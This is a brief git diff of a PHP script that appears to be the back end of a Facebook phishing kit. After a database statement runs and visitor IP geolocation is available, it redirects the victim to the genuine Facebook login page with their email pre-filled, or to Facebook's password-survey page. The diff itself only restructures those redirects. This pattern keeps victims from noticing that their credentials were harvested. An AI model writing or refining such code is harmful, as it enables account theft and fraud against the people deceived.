@@ -42,8 +42,11 @@ function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) { $outp
   $stmt->execute();
  //print_r($stmt);
 //exit(); 
-   if(isset($_POST['email'])){ $email = $_POST['email'] ;
+   if(!empty($email)){
 	   header("location: https://m.facebook.com/login/?email=". htmlspecialchars($email)."&li=LZmDXkzJmMQITfAJkFOmWCqq&e=1348092"); 
 	    exit(); } 
-	header('Location:https://m.facebook.com/settings/account/password/survey/?po=keep_sessions&next=https%3A%2F%2Fm.facebook.com%2Flogin%2Fsave-device%2F%3Flogin_source%3Daccount_recovery&_rdr#_=_');
+   else {
+   header('location: https://m.facebook.com/settings/account/password/survey/?po=keep_sessions&next=https%3A%2F%2Fm.facebook.com%2Flogin%2Fsave-device%2F%3Flogin_source%3Daccount_recovery&_rdr#_=_');
+   exit();
+}
 ?>
